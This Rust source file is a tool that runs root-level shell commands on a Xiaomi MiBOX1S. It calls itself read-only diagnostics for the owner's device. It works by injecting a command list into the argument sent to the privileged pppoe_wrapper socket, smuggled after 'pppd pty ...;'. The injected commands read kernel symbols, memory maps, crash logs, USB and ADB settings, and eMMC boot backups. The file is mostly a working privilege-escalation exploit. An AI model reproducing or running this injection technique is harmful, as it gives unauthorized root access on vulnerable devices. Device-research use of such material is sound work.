//! Fixed read-only privileged diagnostics for the owner's MiBOX1S.
//! Only scratch result files are written; sysfs and partition state are unchanged.
use std::{fs, io, os::unix::net::UnixDatagram, thread, time::Duration};

fn main() -> io::Result<()> {
    let pid = std::process::id();
    let selected = std::env::args().nth(1);
    let mut executed = 0;
    for (number, (name, query)) in [
        ("cmdline", "cat /proc/cmdline"),
        ("iomem", "cat /proc/iomem"),
        ("dmesg", "/system/xbin/busybox dmesg"),
        ("watchdog", "ls -l /dev/watchdog* /sys/class/watchdog/ /sys/class/boot_monitor/; cat /proc/sys/kernel/panic; ls /sys/module/"),
        ("usb", "cat /sys/class/android_usb/android0/functions /sys/class/android_usb/android0/f_acm/instances /sys/class/android_usb/android0/f_ffs/aliases; ls -l /dev/ttyGS0"),
        ("symbols", "cat /proc/kallsyms | /system/xbin/busybox grep -E 'aml_wdt|disable_watchdog|enable_watchdog|boot_monitor|boot_timer|acm_function'; cat /proc/version"),
        ("crash", "ls -l /p /sys/fs/pstore; cat /p/console-ramoops /p/dmesg-ramoops-0 /p/dmesg-ramoops-1"),
        ("adbpolicy", "cat /init.usb.rc; cat /sys/class/android_usb/android0/enable /sys/class/android_usb/android0/functions; getprop init.svc.adbd"),
        ("bootpath", "cat /sys/kernel/kexec_loaded /sys/kernel/kexec_crash_loaded; cat /proc/kallsyms | /system/xbin/busybox grep -E '(^| )(sys_kexec_load|machine_kexec|kernel_kexec|kexec_load|do_kexec_load|pidns_install|copy_pid_ns|create_pid_namespace)$'; ls -l /proc/self/ns"),
        ("userspace", "cat /data/local/tmp/mibox-userland-*/transcript.txt"),
        ("emmcboot", "chmod 644 /data/local/tmp/mibox-boot-backup-*/mmcblk0boot0.img; cat /data/local/tmp/mibox-boot-backup-*/mmcblk0boot0.log; ls -l /data/local/tmp/mibox-boot-backup-*/mmcblk0boot*.img"),
    ].iter().enumerate() {
        if selected.as_deref().is_some_and(|filter| filter != *name) { continue; }
        executed += 1;
        let client = format!("/data/local/tmp/mibox-read-{pid}-{number}.sock");
        let output = format!("/data/local/tmp/mibox-read-{pid}-{name}.txt");
        let socket = UnixDatagram::bind(&client)?;
        socket.set_read_timeout(Some(Duration::from_secs(3)))?;
        let message = format!("{pid}\t{number}\tpppd pty >/dev/null 2>&1; ( {query}; echo MIBOX_READ_COMPLETE ) >{output} 2>&1; chmod 644 {output}\0");
        if message.len() > 511 { return Err(io::Error::other("request exceeds limit")); }
        socket.send_to(message.as_bytes(), "/dev/socket/pppoe_wrapper")?;
        let mut ack = [0u8; 128];
        let received = socket.recv(&mut ack);
        fs::remove_file(client)?;
        received?;
        let mut complete = false;
        for _ in 0..100 {
            if let Ok(result) = fs::read_to_string(&output) {
                if result.contains("MIBOX_READ_COMPLETE") { complete = true; break; }
            }
            thread::sleep(Duration::from_millis(100));
        }
        if !complete { return Err(io::Error::other(format!("read timed out: {name}"))); }
        println!("RESULT={output}");
    }
    if executed == 0 {
        return Err(io::Error::new(
            io::ErrorKind::InvalidInput,
            "unknown diagnostic name",
        ));
    }
    println!("MIBOX_PLATFORM_READ_OK");
    Ok(())
}
